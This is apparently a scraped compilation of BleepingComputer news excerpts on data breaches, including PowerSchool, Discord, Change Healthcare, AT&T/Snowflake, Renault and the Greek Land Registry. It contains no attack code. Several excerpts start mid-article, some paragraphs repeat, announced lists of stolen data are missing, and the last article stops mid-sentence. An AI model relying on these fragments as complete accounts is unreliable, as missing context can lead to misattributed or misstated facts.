The agency said hackers managed to compromise employee terminals and steal 1.2 GB of data, corresponding to roughly 0.0006% of the total data held by the government organization. The stolen data reportedly does not contain any citizens' personal information but primarily consists of typical administrative documents, the exposure of which is not expected to impact the registry's operations. The announcement also mentions that the hackers attempted to create a malicious user to infiltrate the agency's central database, but they failed. One of the database's backups, which are updated daily, was accessed by the unauthorized actors. However, the subsequent attempt to exfiltrate the data to an external server was blocked. The Land Registry's internal investigation, aided by the Cybersecurity Directorate of the General Staff of National Defense, has not found any evidence of ransomware having been deployed on the breached systems. Emergency actions to reduce the risk of ransomware have been taken, like terminating all VPN access to block malicious users. As a precaution, all of the registry's employees have had their passwords reset, and two-factor authentication has been made mandatory to help protect their accounts from unauthorized access. The last recorded attack occurred in the early morning of July 19, 2024, and was successfully thwarted. No further updates have been provided, so it's unknown if the attacks continue. Currently, the agency's digital services continue to operate as normal, and transactions with citizens, which are considered safe, have remained uninterrupted throughout the attacks. In 2022, Greece's state-owned postal services provider, ELTA , suffered a ransomware attack that caused a country-wide service disruption.

With a revenue of more than $55 billion, the French car maker has 170,000 employees and an annual production output of 2.2 million vehicles. Dacia is a subsidiary brand that offers reliable vehicles at an affordable price. Yesterday, both brands informed customers [ 1 , 2 ] that they were impacted by the cybersecurity incident that occurred at an unamed third party. “We are very sorry to inform you about a cyber-attack on one of our third-party providers, leading to some Renault UK customers’ personal data being taken from one of their systems,” reads the notice. The information that has been exposed includes the following data types: An attacker could use this type of information to target users in phishing campaigns, scams, and other forms of social engineering. The carmaker's notification highlights that banking or financial information has not been exposed due to this incident. Renault noted that the targeted company has isolated the incident and removed the threat from its networks. Authorities in the U.K., including the Information Commissioner's Office (ICO) have also been informed of the cyberattack. BleepingComputer has contacted Renault to ask about the identity of the third-party supplier and the number of affected customers. A spokesperson for the company said that the number of impacted clients is not yet available and the contract agreement prevents them from disclosing the name of the affected provider. The recipients of the notifications are advised to remain vigilant against unsolicited phone calls and emails, and never share their passwords with anyone. The incident follows the cyberattack at Jaguar Land Rover in the UK, which had a significant impact on operations as the carmaker was forced to halt production for almost a month . That attack also involved data theft , although not many details have been disclosed publicly, and had such an impact that JLR had to take a UK government-guaranteed £1.5 billion loan to restore its supply chain.

A spokesperson for the company said that the number of impacted clients is not yet available and the contract agreement prevents them from disclosing the name of the affected provider. The recipients of the notifications are advised to remain vigilant against unsolicited phone calls and emails, and never share their passwords with anyone. The incident follows the cyberattack at Jaguar Land Rover in the UK, which had a significant impact on operations as the carmaker was forced to halt production for almost a month . That attack also involved data theft , although not many details have been disclosed publicly, and had such an impact that JLR had to take a UK government-guaranteed £1.5 billion loan to restore its supply chain.

PowerSchool hacker claims they stole data of 62 million students,https://www.bleepingcomputer.com/news/security/powerschool-hacker-claims-they-stole-data-of-62-million-students/,Lawrence Abrams,"January 22, 2025","The hacker who breached education tech giant PowerSchool claimed in an extortion demand that they stole the personal data of 62.4 million students and 9.5 million teachers. PowerSchool is a cloud-based software solutions provider for K-12 schools and districts that provides tools for enrollment, communication, attendance, staff management, learning systems, analytics, and finance. On January 7th, PowerSchool disclosed that it suffered a cyberattack after a threat actor used stolen credentials to access the company's PowerSource customer support portal. Using this access, the threat actor utilized a customer support maintenance access tool to download student and teacher data from districts' PowerSIS databases. As first reported and seen by BleepingComputer, an FAQ stated that sensitive information, such as Social Security Numbers, medical information, and grades, was stolen for a subset of students impacted by the breach. This FAQ also stated that PowerSchool paid a ransom to prevent the stolen data from being leaked privately, seeing a video of the threat actor claiming to delete the data. While the company showed more transparency in the private customer FAQ than other security disclosures, they still have not provided specific numbers as to how many students and teachers were impacted by the breach, frustrating parents, teachers, and school administrators who have spoken to BleepingComputer. However, BleepingComputer has received information that sheds more light on the impact of this breach. According to multiple sources, the threat actor behind the PowerSchool attack claimed to have stolen the data of 6,505 school districts in the US, Canada, and other countries in an extortion demand to the company. In total, BleepingComputer was told that the PowerSchool data breach impacted 62,488,628 students and 9,506,624 teachers. In the information seen by BleepingComputer, the largest districts allegedly impacted by the PowerSchool breach are: It should be noted that the numbers for Canadian school boards tend to be larger than US school districts as the boards govern all of the schools in a specific region in Canada. While PowerSchool would not comment on specific numbers as its investigation is still ongoing, they did stress to BleepingComputer that the type of data exposed in the data breach varies per district. PowerSchool says that school districts decide what information is stored in the SIS database based on their district or State policy requirements. For this reason, it is expected that less than a quarter of impacted students had their Social Security Number exposed in the breach. The company also said that they have both cloud-based and on-premise PowerSchool SIS customers. For those districts self-hosting their databases, the data review is more complicated as they require the district to share information for analysis. In response to questions about our reporting, PowerSchool shared the following statement with BleepingComputer. ""We understand we have a very large customer base on PowerSchool SIS, but we do feel it important to highlight that we expect the majority of involved individuals – in fact more than three quarters – did not have social security numbers exfiltrated. We are receiving many questions about what type of data was involved and it is difficult to make broad brush statements because the answer varies by individual customer and is dependent on customer choice and on state or district policies and requirements. We care deeply about the students, teachers, and families we serve and are wholeheartedly committed to supporting them. PowerSchool will be offering two years of complimentary identity protection services and two years of complimentary credit monitoring services for all applicable students and educators whose information was involved. We are doing this regardless of whether an individual’s Social Security Number was exfiltrated (meaning, we are doing this regardless of whether or not we are required to by regulation). We will also be making notifications on our customers’ behalf to state attorneys general offices, educators, students, parents, and other impacted stakeholders. We sincerely hope to relieve the burden of these notifications on our customers and their institutions."" PowerSchool says they will offer 2 years of free identity protection and credit monitoring services for all impacted students and educators. The company will also send data breach notifications on behalf of customers to State Attorney General's offices and those impacted. A timeline as to when this will happen is unclear. Furthermore, PowerSchool promised to release an incident report based on CrowdStrike's investigations on January 17th, but that date has passed without a report being published. When asked when the report would be available, PowerSchool said CrowdStrike is still working to finalize the forensic report, which will be made available to customers when completed. In the interim, PowerSchool has posted an update to its customer-only FAQ, saying customers can receive a confidential CrowdStrike fact sheet on what is known so far. PowerSchool also set up a dedicated public website that those impacted can monitor for further updates.

For those districts self-hosting their databases, the data review is more complicated as they require the district to share information for analysis. In response to questions about our reporting, PowerSchool shared the following statement with BleepingComputer. ""We understand we have a very large customer base on PowerSchool SIS, but we do feel it important to highlight that we expect the majority of involved individuals – in fact more than three quarters – did not have social security numbers exfiltrated. We are receiving many questions about what type of data was involved and it is difficult to make broad brush statements because the answer varies by individual customer and is dependent on customer choice and on state or district policies and requirements. We care deeply about the students, teachers, and families we serve and are wholeheartedly committed to supporting them. PowerSchool will be offering two years of complimentary identity protection services and two years of complimentary credit monitoring services for all applicable students and educators whose information was involved. We are doing this regardless of whether an individual’s Social Security Number was exfiltrated (meaning, we are doing this regardless of whether or not we are required to by regulation). We will also be making notifications on our customers’ behalf to state attorneys general offices, educators, students, parents, and other impacted stakeholders. We sincerely hope to relieve the burden of these notifications on our customers and their institutions."" PowerSchool says they will offer 2 years of free identity protection and credit monitoring services for all impacted students and educators. The company will also send data breach notifications on behalf of customers to State Attorney General's offices and those impacted. A timeline as to when this will happen is unclear. Furthermore, PowerSchool promised to release an incident report based on CrowdStrike's investigations on January 17th, but that date has passed without a report being published. When asked when the report would be available, PowerSchool said CrowdStrike is still working to finalize the forensic report, which will be made available to customers when completed. In the interim, PowerSchool has posted an update to its customer-only FAQ, saying customers can receive a confidential CrowdStrike fact sheet on what is known so far. PowerSchool also set up a dedicated public website that those impacted can monitor for further updates.

DPRK hacking groups breach South Korean defense contractors,https://www.bleepingcomputer.com/news/security/dprk-hacking-groups-breach-south-korean-defense-contractors/#comment_form,Bill Toulas,"April 23, 2024","The National Police Agency in South Korea issued an urgent warning today about North Korean hacking groups targeting defense industry entities to steal valuable technology information. The police discovered several instances of successful breaches of defense companies in South Korea involving the hacking groups Lazarus, Andariel, and Kimsuky, all part of the North Korean hacking apparatus. According to the announcement, the attackers breached the organizations by leveraging vulnerabilities in targets' or their subcontractors' environments to plant malware capable to exfiltrate data. The National Police Agency and the Defense Acquisition Program Administration conducted a special inspection earlier this year between January 15 and February 16 and implemented protective measures to secure critical networks. This special operation discovered multiple companies that had been compromised since late 2022 but were unaware of the breach until authorities informed them. The police report highlights three cases involving each of the mentioned hacking groups, displaying multi-faceted attack methods aimed at stealing defense tech. Lazarus hackers exploited poorly managed network connection systems designed for testing and penetrated the internal networks of a defense company since November 2022. After infiltrating the network, they gathered critical data stored in at least six of the firm's computers and transferred it to a cloud server abroad. The second attack was attributed to the Andariel group, who stole account information from an employee of a maintenance company that serviced defense subcontractors. Using this stolen account in October 2022, they installed malware on the servers of these subcontractors, leading to significant leaks of defense-related technical data. This network infiltration was further exacerbated by employees using the same passwords for personal and work accounts. A third attack highlighted in the police's advisory, Kimsuky exploited a vulnerability in the email server of a defense subcontractor between April and July 2023, which allowed large files to be downloaded without the need to authenticate. This vulnerability was used to download and steal substantial technical data from the company's internal server. The Korean police recommends both defense companies and their subcontractors to improve network security segmentation, periodic password resets, setting up two-factor authentication on all critical accounts, and blocking foreign IP accesses.

Americold employs 17,000 people worldwide and operates more than 24 temperature-controlled warehouses across North America, Europe, Asia-Pacific, and South America. The April network breach led to an outage affecting the company's operations after Americold forced it to shut down its IT network to contain the breach and ""rebuild the impacted systems."" Americold also told customers via a private memo issued after the attack to cancel all inbound deliveries and reschedule outbound shipments, except for those deemed critically time-sensitive and nearing expiration. In notification letters sent on December 8 to 129,611 current and former employees (and dependents) affected by the data breach, the company revealed the attackers were able to steal some data from its network on April 26.

As a result of this review, it appears that some of your personal information may have been involved,"" the letters read. Personal information stolen by the attackers includes a combination of name, address, Social Security number, driver's license/state ID number, passport number, financial account information (such as bank account and credit card numbers), and employment-related health insurance and medical information for each affected individual. Another cyberattack hit Americold in November 2020, impacting its operations, phone systems, email services, inventory management, and order fulfillment.

The gang also leaked a 6GB archive of accounting and finance documents allegedly stolen from Americold's network, including private and confidential information. The ransomware group also plans to release human resources, legal, company audit information, customer documents, and accident reports.

Although the organization does not describe the type of attack, the Hunters International ransomware group has claimed the breach and leaked the stolen data on the dark web. IdeaLab is a California-based technology startup incubator that since 1996 has launched over 150 companies, including GoTo.com, CitySeach, eToys, Authy, Pet.net, Heliogen, and Energy Vault. Being one of the longest-running and influential venture capital firms in the U.S., the company has generated considerable economic impact, job creation, and investment value. On October 7, 2024, IdeaLab detected suspicious activity on its network. Upon investigation, it was determined that threat actors had gained unauthorized access to its systems three days earlier. The company contracted third-party services to help with the investigation, which finished on June 26 this year. The results confirmed that data had been stolen from its systems, impacting current and former employees, current and former support service contractors, and their dependents. In the sample notification shared with authorities , IdeaLab did not describe all the information exposed in the incident, saying only that the hackers accessed only names in combination with various other types of data. On October 23, 2024, likely after a failed extortion attempt, Hunters International disclosed the data stolen from IdeaLab. The leak contains 137,000 files totaling 262.8 GB in size. At the time of writing, the download link no longer works, but it’s very likely that multiple threat actors downloaded the files earlier. Earlier today, the threat actor announced that they're shutting down Hunters International and deleted all company entries and files from its extortion portal. The hackers offered to share free decryption keys for all their victims. However, this may be part of a rebrand attempt, as researchers at cybersecurity company Group-IB in April said the threat actor launched a new, extortion-only operation called World Leaks.

RapeFlake is a custom tool created by the threat actors to perform reconnaissance and exfiltrate data from Snowflake's databases. As previously reported, the Snowflake attacks targeted many organizations, including Santander, Ticketmaster, AT&T , Advance Auto Parts , Neiman Marcus , Los Angeles Unified , Pure Storage , and Cylance . These attacks were claimed by an extortion group known as ShinyHunters. These attacks were conducted using compromised Snowflake credentials stolen by infostealers, which were then used to download company data for use in extortion schemes. Ticketmaster was among the most widely extorted victims in the Snowflake attack, which led to the theft of personal and ticketing information. After the data was offered for sale online, the company confirmed the breach at the end of May and began notifying affected customers. Following the initial leak, the threat actors ramped up their extortion attempts by releasing what they claimed were print-at-home tickets and even alleged Taylor Swift tickets in a series of posts on a hacking forum. While Arkana did not specify the origin of the data, the use of Snowflake references and the file names matching previously leaked files indicates that the group was attempting to resell old stolen data. Whether or not Arkana previously purchased this data, whether the group is made up of threat actors who previously had the data, or whether they are working with ShinyHunters to sell it is unclear. On June 9, the entry for the Ticketmaster data had been removed from the Arkana Security data leak site. The name ""ShinyHunters"" has been linked to a large number of breaches over the years, including the massive PowerSchool data breach where data was stolen for 62.4 million students and 9.5 million teachers for 6,505 school districts across the U.S., Canada, and other countries. More recently, Mandiant tied ShinyHunters to a recent campaign targeting Salesforce accounts , where threat actors were breaching accounts to steal customer data and extort companies. As numerous threat actors tied to ShinyHunters have been arrested over the past three years [ 1 , 2 , 3 ], it is unclear if this is the original group or other threat actors claiming to be them to throw off law enforcement.

Hackers claim Discord breach exposed data of 5.5 million users,https://www.bleepingcomputer.com/news/security/hackers-claim-discord-breach-exposed-data-of-55-million-users/#comment_form,Lawrence Abrams,"October 8, 2025","Discord says they will not be paying threat actors who claim to have stolen the data of 5.5 million unique users from the company's Zendesk support system instance, including government IDs and partial payment information for some people. The company is also pushing back on claims that 2.1 million photos of government IDs were disclosed in the breach, stating that approximately 70,000 users had their government ID photos exposed. While the attackers claim the breach occurred through Discord's Zendesk support instance, the company has not confirmed this and only described it as involving a third-party service used for customer support. ""First, as stated in our blog post, this was not a breach of Discord, but rather a third-party service we use to support our customer service efforts,"" Discord told BleepingComputer in a statement. ""Second, the numbers being shared are incorrect and part of an attempt to extort a payment from Discord. Of the accounts impacted globally, we have identified approximately 70,000 users that may have had government-ID photos exposed, which our vendor used to review age-related appeals."" ""Third, we will not reward those responsible for their illegal actions."" In a conversation with the hackers, BleepingComputer was told that Discord is not being transparent about the severity of the breach, stating that they stole 1.6 TB of data from the company's Zendesk instance. According to the threat actor, they gained access to Discord’s Zendesk instance for 58 hours beginning on September 20, 2025. However, the attackers say the breach did not stem from a vulnerability or breach of Zendesk but rather from a compromised account belonging to a support agent employed through an outsourced business process outsourcing (BPO) provider used by Discord. As many companies have outsourced their support and IT help desks to BPOs, they have become a popular target for attackers to gain access to downstream customer environments. The hackers allege that Discord's internal Zendesk instance gave them access to a support application, known as Zenbar, that allowed them to perform various support-related tasks, such as disabling multi-factor authentication and looking up users’ phone numbers and email addresses. Using access to Discord's support platform, the attackers claimed to have stolen 1.6 terabytes of data, including around 1.5 TB of ticket attachments and over 100 GB of ticket transcripts. The hackers say this consisted of roughly 8.4 million tickets affecting 5.5 million unique users, and that about 580,000 users contained some sort of payment information. The threat actors themselves acknowledged to BleepingComputer that they are unsure how many government IDs were stolen, but they believe it is more than 70,000, as they say there were approximately 521,000 age-verification tickets. The threat actors also shared a sample of the stolen user data, which can include a wide variety of information, including email addresses, Discord usernames and IDs, phone numbers, partial payment information, date of birth, multi-factor authentication related information, suspicious activity levels, and other internal information. The payment information for some users was allegedly retrievable through Zendesk integrations with Discord's internal systems. These integrations reportedly allowed the attackers to perform millions of API queries to Discord's internal database via the Zendesk platform and retrieve further information. BleepingComputer could not independently verify the hackers' claims or the authenticity of the provided data samples. The hacker said the group demanded $5 million in ransom, later reducing it to $3.5 million, and engaged in private negotiations with Discord between September 25 and October 2. After Discord ceased communications and released a public statement about the incident, the attackers said they were ""extremely angry"" and plan to leak the data publicly if an extortion demand is not paid. BleepingComputer contacted Discord with additional questions about these claims, including why they retained government IDs after completing age verification, but did not receive answers beyond the above statement.

Johnson Controls is a multinational conglomerate that develops and manufactures industrial control systems, security equipment, HVAC systems, and fire safety equipment for buildings. The company employs over 100,000 people through its corporate operations and subsidiaries across 150 countries, reporting sales of $27.4 billion in 2024. As BleepingComputer first reported, Johnson Controls was hit by a ransomware attack in September 2023, following a breach of the company's Asian offices in February 2023 and subsequent lateral movement through its network. ""Based on our investigation, we determined that an unauthorized actor accessed certain Johnson Controls systems from February 1, 2023 to September 30, 2023 and took information from those systems,"" the company says in data breach notification letters filed with California's Attorney General, redacted to conceal what information was stolen in the attack. ""After becoming aware of the incident, we terminated the unauthorized actor's access to the affected systems. In addition, we engaged third-party cybersecurity specialists to further investigate and resolve the incident. We also notified law enforcement and publicly disclosed the incident in filings on September 27, 2023; November 13, 2023; and December 14, 2023."" The cyberattack forced Johnson Controls to shut down large portions of its IT infrastructure after the threat actors encrypted many devices, which affected its operations worldwide and customer-facing systems. Johnson Controls confirmed in a January 2024 SEC filing that the cyberattack was orchestrated by a ransomware gang that also stole documents from compromised systems during the breach. While the firm didn't attribute the incident to a specific ransomware operation, the attack was linked to the Dark Angels ransomware group based on a sample of a VMware ESXi encryptor deployed during the breach, which stated that it was used against Johnson Controls. ​BleepingComputer was also told that the ransom note linked to a negotiation chat where the ransomware gang demanded $51 million for a decryptor and to delete data stolen from Johnson Controls' network. The ransomware operators also encrypted the company's VMware ESXi virtual machines during the attack and claimed to have stolen over 27 TB of documents containing corporate data. At the time, the company stated that expenses related to incident response and remediation had already reached $27 million , but also noted that it expected this amount to increase as the investigation and remediation efforts progressed. Dark Angels , the ransomware operation behind Johnson Controls' 2023 breach, surfaced in May 2022 when it began targeting organizations worldwide in double-extortion attacks. In these attacks, the group steals sensitive data and uses it to pressure victims under the threat of publishing it online on its dark web leak site, called Dunghill Leaks. They also deploy ransomware to encrypt all devices on the network after gaining access to the Windows domain controller, using Windows and VMware ESXi encryptors based on leaked Babuk ransomware source code. However, cybersecurity researcher MalwareHunterTeam told BleepingComputer that the Linux encryptor used in the Johnson Controls attack was the same as others used by Ragnar Locker ransomware since 2021.

Recently, a threat actor leaked samples of data that was allegedly stolen from a genetics firm and, a few days later, offered to sell data packs belonging to 23andMe customers. The initial data leak was limited, with the threat actor releasing 1 million lines of data for Ashkenazi people. However, on October 4, the threat actor offered to sell data profiles in bulk for $1-$10 per 23andMe account, depending on how many were purchased. A 23andMe spokesperson confirmed the data is legitimate and told BleepingComputer that the threat actors used exposed credentials from other breaches to access 23andMe accounts and steal the sensitive data. ""We were made aware that certain 23andMe customer profile information was compiled through access to individual 23andMe.com accounts,"" stated 23andMe's spokesperson ""We do not have any indication at this time that there has been a data security incident within our systems."" ""Rather, the preliminary results of this investigation suggest that the login credentials used in these access attempts may have been gathered by a threat actor from data leaked during incidents involving other online platforms where users have recycled login credentials."" The information that has been exposed from this incident includes full names, usernames, profile photos, sex, date of birth, genetic ancestry results, and geographical location. BleepingComputer has also learned that the number of accounts sold by the cybercriminal does not reflect the number of 23andMe accounts breached using exposed credentials. The compromised accounts had opted into the platform's 'DNA Relatives' feature, which allows users to find genetic relatives and connect with them. The threat actor accessed a small number of 23andMe accounts and then scraped the data of their DNA Relative matches, which shows how opting into a feature can have unexpected privacy consequences. 23andMe told BleepingComputer that the platform offers two-factor authentication as an additional account protection measure and encourages all users to enable it. Users should refrain from reusing passwords and consistently employ strong, distinct credentials for every online account they have.

The threat actor accessed a small number of 23andMe accounts and then scraped the data of their DNA Relative matches, which shows how opting into a feature can have unexpected privacy consequences. 23andMe told BleepingComputer that the platform offers two-factor authentication as an additional account protection measure and encourages all users to enable it. Users should refrain from reusing passwords and consistently employ strong, distinct credentials for every online account they have.

Now a top-10 commercial bank with total assets of $535 billion, Truist offers a wide range of services, including consumer and small business banking, commercial banking, corporate and investment banking, insurance, wealth management, and payments.

Change Healthcare hacked using stolen Citrix account with no MFA,https://www.bleepingcomputer.com/news/security/change-healthcare-hacked-using-stolen-citrix-account-with-no-mfa/,Bill Toulas,"April 30, 2024","4/30/24: Update added below about Change Healthcare Citrix credentials previously stolen by information-stealing malware. UnitedHealth confirms that Change Healthcare's network was breached by the BlackCat ransomware gang, who used stolen credentials to log into the company's Citrix remote access service, which did not have multi-factor authentication enabled. This was revealed in UnitedHealth CEO Andrew Witty's written testimony published ahead of a House Energy and Commerce subcommittee hearing scheduled for tomorrow. The ransomware attack on Change Healthcare occurred in late February 2024 , leading to severe operational disruptions on Optum's Change Healthcare platform. This impacted a wide range of critical services used by healthcare providers across the U.S., including payment processing, prescription writing, and insurance claims, and caused financial damages estimated at $872 million . Previously, the BlackCat ransomware gang claimed they had received a $22 million ransom payment from UnitedHealth, which was stolen from the affiliate who conducted the attack in an exit scam. Shortly after, the affiliate claimed to still have the data and partnered with RansomHub to initiate an additional extortion demand by leaking stolen data . The healthcare org recently admitted that it paid a ransom to protect people's data post-compromise, but no details about the attack or who carried it out were officially disclosed. RansomHub has since removed the Change Healthcare entry from its site, indicating that an additional ransom was paid. In testimony by Andrew Witty, the CEO confirmed that the attack occurred on the morning of February 21 when the threat actors began encrypting systems and rendering them inaccessible to the organization's employees. For the first time, the company also officially confirmed BleepingComputer's report that the ALPHV/BlackCat ransomware operation was behind the attack. While the actual public-facing attack occurred on February 21, Witty revealed that the attacker had access to the company's network for approximately ten days before deploying their encryptors. During this time, the threat actors spread through the network and stole corporate and patient data that would be used in their extortion attempts. The investigations, which are still ongoing, revealed that the attackers first gained access to Change Healthcare's Citrix portal on February 12, 2024, using stolen employee credentials. It is unknown whether those credentials were initially stolen via a phishing attack or information-stealing malware. ""On February 12, criminals used compromised credentials to remotely access a Change Healthcare Citrix portal, an application used to enable remote access to desktops,"" explained Witty . ""The portal did not have multi-factor authentication. Once the threat actor gained access, they moved laterally within the systems in more sophisticated ways and exfiltrated data. Ransomware was deployed nine days later."" The CEO also shared a personal moment, stating that the choice to pay a ransom was entirely his and one of the hardest decisions he had to make. ""As chief executive officer, the decision to pay a ransom was mine. This was one of the hardest decisions I've ever had to make. And I wouldn't wish it on anyone,"" Witty wrote in his testimony. Witty further outlined their immediate actions to secure their systems following the attack, characterizing them as ""swift and forceful,"" noting that the threat was successfully contained by taking everything down despite knowing the impact this would have on people. Following the attack, the organization's IT team replaced thousands of laptops, rotated credentials, and completely rebuilt Change Healthcare's data center network and core services in just a few weeks. Witty states such a task would usually have taken several months. Although data samples that leaked online contained protected health information (PHI) and personally identifiable information (PII), Witty notes that, so far, they have seen no evidence of exfiltration of materials such as doctors' charts or complete medical histories. Concerning the status of the impacted services, pharmacy networks operate at a fraction of a percent below normal, medical claims flow nearly at normal levels, and payment processing at approximately 86% of pre-incident levels. Update 4/30/24: After publishing our story, Hudson Rock CTO Alon Gal told BleepingComputer that on February 8 the company's threat intelligence platform detected a Change Healthcare employee's Citrix credentials stolen through information-stealing malware. The stolen credentials are associated with the URL remoteapps[.]changehealthcare[.]com/vpn/index.htm, and while that site is no longer accessible, BleepingComputer has confirmed it to be the URL for Change Healthcare's Citrix Gateway login page.

20 million Cutout.Pro user records leaked on data breach forum,https://www.bleepingcomputer.com/news/security/20-million-cutoutpro-user-records-leaked-on-data-breach-forum/#comment_form,Bill Toulas,"February 29, 2024","AI service Cutout.Pro has suffered a data breach exposing the personal information of 20 million members, including email addresses, hashed and salted passwords, IP addresses, and names. Cutout.Pro is an AI-powered photo and video editing platform for image enhancement, background removal, diffusion, colorizing, old photo restoration, and content generation. On Tuesday, someone using the alias 'KryptonZambie' shared a link on the BreachForums hacking forum to CSV files containing 5.93 GB of data stolen from Cutout.Pro. These CSV files contain what appears to be a database dump consisting of 41.4 million records, with 20 million of those records consisting of unique email addresses. The cybercriminal also stated that they still had access to the breached system, so the victim hadn't realized the compromise by the time of the data publication. From samples seen by BleepingComputer, the data that was leaked includes the following information: Data breach monitoring and alerting service Have I Been Pwned (HIBP) added the breach to its catalog yesterday, confirming that the leaked dataset includes the information for 19,972,829 people. Also, the threat actor distributes the files on their personal Telegram channel, causing a much wider circulation of the stolen data. Though Cutout.Pro has not verified the security incident from their side via an official statement, HIBP's founder Troy Hunt told BleepingComputer that he independently verified multiple matches from the leaked email addresses, confirming that password reset requests went through. BleepingComputer also confirmed yesterday that emails listed in the data leak match legitimate Cutout.Pro users. BleepingComputer emailed the company today and yesterday but did not receive a response. Hunt says he also tried to contact the service provider, with similar results. If you have used Cutout.Pro in the past, it is recommended that you reset your password immediately on the service and any other online platforms where you might be using the same credentials. MD5 password hashes are considered relatively easy to crack by modern standards, which is why more secure algorithms like bcrypt have superseded them. Hence, threat actors brute-forcing the leaked password hashes is a realistic possibility.

From samples seen by BleepingComputer, the data that was leaked includes the following information: Data breach monitoring and alerting service Have I Been Pwned (HIBP) added the breach to its catalog yesterday, confirming that the leaked dataset includes the information for 19,972,829 people. Also, the threat actor distributes the files on their personal Telegram channel, causing a much wider circulation of the stolen data. Though Cutout.Pro has not verified the security incident from their side via an official statement, HIBP's founder Troy Hunt told BleepingComputer that he independently verified multiple matches from the leaked email addresses, confirming that password reset requests went through. BleepingComputer also confirmed yesterday that emails listed in the data leak match legitimate Cutout.Pro users. BleepingComputer emailed the company today and yesterday but did not receive a response. Hunt says he also tried to contact the service provider, with similar results. If you have used Cutout.Pro in the past, it is recommended that you reset your password immediately on the service and any other online platforms where you might be using the same credentials. MD5 password hashes are considered relatively easy to crack by modern standards, which is why more secure algorithms like bcrypt have superseded them. Hence, threat actors brute-forcing the leaked password hashes is a realistic possibility. Furthermore, all Cutout.Pro users should be on the lookout for targeted phishing scams that attempt to gather further information from the user. It's budget season!

The company confirmed to BleepingComputer that the data was stolen from the Snowflake account between April 14 and April 25, 2024. In a Friday morning Form 8-K filling with the SEC, AT&T says that the stolen data contains the call and text records of nearly all AT&T mobile clients and customers of mobile virtual network operators (MVNOs) made from May 1 to October 31, 2022 and on January 2, 2023. The stolen data includes: The exposed records did not contain the content of the calls or texts, customer names, or any other personal information such as Social Security numbers or dates of birth. Although the accessed logs do not contain sensitive information that directly exposes customer identities, the communications metadata can be used to correlate them with publicly available information and easily derive identities in many cases. The company says that after learning of the breach they worked with cybersecurity experts and notified law enforcement. The US Department of Justice gave AT&T permision twice, on May 9, 2024 and June 5, 2024, to delay public notification due to the potential risks to national security and public safety. ""Shortly after identifying a potential breach to customer data and before making its materiality decision, AT&T contacted the FBI to report the incident. In assessing the nature of the breach, all parties discussed a potential delay to public reporting under Item 1.05(c) of the SEC Rule, due to potential risks to national security and/or public safety,"" the FBI told BleepingComputer. ""AT&T, FBI, and DOJ worked collaboratively through the first and second delay process, all while sharing key threat intelligence to bolster FBI investigative equities and to assist AT&T’s incident response work."" ""The FBI prioritizes assistance to victims of cyber-attacks, encourages organizations to establish a relationship with their local FBI field office in advance of a cyber incident, and to contact the FBI early in the event of breach."" AT&T is working with law enforcement to arrest those involved and states that they understand at least one person has already been apprehended. AT&T said it has implemented additional cybersecurity measures to block unauthorized access attempts in the future, and it promised to notify current and former customers impacted by this incident soon. Meanwhile, AT&T customers can follow the links provided on this FAQ page to check if their phone number's data was exposed and to download the data associated with their number that was stolen. As of today, AT&T says it has no evidence the accessed data has been made publicly available and says the incident is not related to the 2021 data breach AT&T confirmed earlier this year impacted 51 million customers. AT&T has confirmed to BleepingComputer that the data was stolen from its Snowflake account as part of a wave of recent data theft attacks using compromised credentials. Snowflake is a cloud-based database provider that allows customers to perform data warehousing and analytics on large volumes of data. Last month, Mandiant revealed that a financially motivated threat actor tracked as 'UNC5537' was behind multiple attacks against Snowflake customers, using account credentials stolen via infostealer malware.

Halliburton is a global provider of products and services to the energy industry, offering a range of solutions for oil and gas reservoirs, including exploration, development, and production. The company operates in 70 countries, employing 48,000 individuals and reporting revenue that surpassed $23.02 billion. In a filing with the U.S. Securities and Exchange Commission (SEC) on August 23, 2024, the company informed that an unauthorized third party had gained access to its systems. In response to this breach, Halliburton shut down some of its IT infrastructure, which caused limited operational impact and client system disconnections. A few days later, it was revealed that the RansomHub ransomware gang was responsible for the attack at Halliburton. A subsequent 8-K Form filing with the SEC confirmed that the threat actors had stolen data from the company's network. However, the type of information and scope of the data breach still remain subject to ongoing investigations. At the time, Halliburton stated that it was unlikely the incident would have a material impact on its financials, and its third quarter 2024 earnings report confirms this estimate. ""We experienced a $0.02 per share impact to our adjusted earnings from lost or delayed revenue due to the August cybersecurity event and storms in the Gulf of Mexico,"" commented Jeff Miller, Chairman, President, and CEO at Halliburton.

The data breach was discovered in early February 2025, but the exact date when the hackers gained initial access to NTT's systems hasn't been determined. ""NTT Communications Corporation discovered on February 5 that our facilities had been subjected to unauthorized access,"" reads the announcement . ""On February 6, we confirmed that some information might have been leaked externally."" Specifically, NTT says hackers breached its 'Order Information Distribution System,' which held details on 17,891 corporate customers (companies), but no data on personal customers (consumers). The types of data that may have been stolen by hackers includes: NTT says contracts for corporate smartphones and mobile phones provided directly by NTT Docomo were not affected by this incident.

While BleepingComputer has not been able to confirm the legitimacy of all the data in the database, we have confirmed some of the entries are accurate, including those whose data is not publicly accessible for scraping. The data is from an alleged 2021 AT&T data breach that a threat actor known as ShinyHunters attempted to sell on the RaidForums data theft forum for a starting price of $200,000 and incremental offers of $30,000. The hacker stated they would sell it immediately for $1 million. AT&T told BleepingComputer then that the data did not originate from them and that its systems were not breached. ""Based on our investigation today, the information that appeared in an internet chat room does not appear to have come from our systems,"" AT&T told BleepingComputer in 2021. When we told ShinyHunters that AT&T said the data did not originate from them, they replied, ""I don't care if they don't admit. I'm just selling."" AT&T continues to tell BleepingComputer today that they still see no evidence of a breach in their systems and still believe that this data did not originate from them. BleepingComputer asked AT&T if it was possible the data came from a third-party service provider or vendor but has not received a response at this time. Today, another threat actor known as MajorNelson leaked data from this alleged 2021 data breach for free on a hacking forum, claiming it was the data ShinyHunters attempted to sell in 2021. This data includes names, addresses, mobile phone numbers, encrypted date of birth, encrypted social security numbers, and other internal information. However, the threat actors have decrypted the birth dates and social security numbers and added them to another file in the leak, making those also accessible. BleepingComputer has reviewed the data, and while we cannot confirm that all 73 million lines are accurate, we verified some of the data contains correct information, including social security numbers, addresses, dates of birth, and phone numbers. This was done by confirming the leaked data with people I know who were impacted and verifying that many of the listed users have online AT&T accounts. Furthermore, other cybersecurity researchers, such as Dark Web Informer , who first told BleepingComputer about the leaked data, and VX-Underground have also confirmed some of the data to be accurate. At the same time, BleepingComputer could not find data for people known to be AT&T customers in 2021 and earlier. However, this would not be unusual as their total mobile customer base at the end of 2021 was 201.8 million subscribers, meaning that if this data dump is legitimate, it is only a partial dump. At this point, it's a mystery where the data came from. Still, regardless of where it originated, all signs point to this being data of AT&T customers. Therefore, if you were an AT&T customer before and through 2021, it is safer to assume that your data was exposed and can be used in targeted attacks, including SMS and email phishing and SIM 